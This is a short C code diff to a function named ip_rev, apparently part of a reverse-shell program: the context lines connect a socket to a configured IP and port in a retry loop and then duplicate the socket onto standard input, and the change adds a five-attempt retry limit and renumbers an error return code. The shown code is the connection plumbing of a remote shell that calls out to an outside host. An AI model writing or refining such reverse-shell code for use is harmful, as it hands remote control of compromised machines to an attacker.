@@ -63,9 +63,13 @@ int ip_rev(void)
 	hints.ai_socktype = SOCK_STREAM;
 	getaddrinfo(IP, PORT, &hints, &res);
 
+	int flag =0;
 	while(connect(s,res->ai_addr,res->ai_addrlen) != 0)
 	{
 		sleep(1);
+		flag = flag+1;
+		if(flag > 5)
+			return -3;
 	}
 
 	dup2(s, 0);
@@ -88,7 +92,7 @@ int ip_rev(void)
     {
         shutdown(s,SHUT_RDWR); // Shutdown Further R/W Operation From Client
         close(s);
-        return -3;
+        return -4;
     }
 }
 
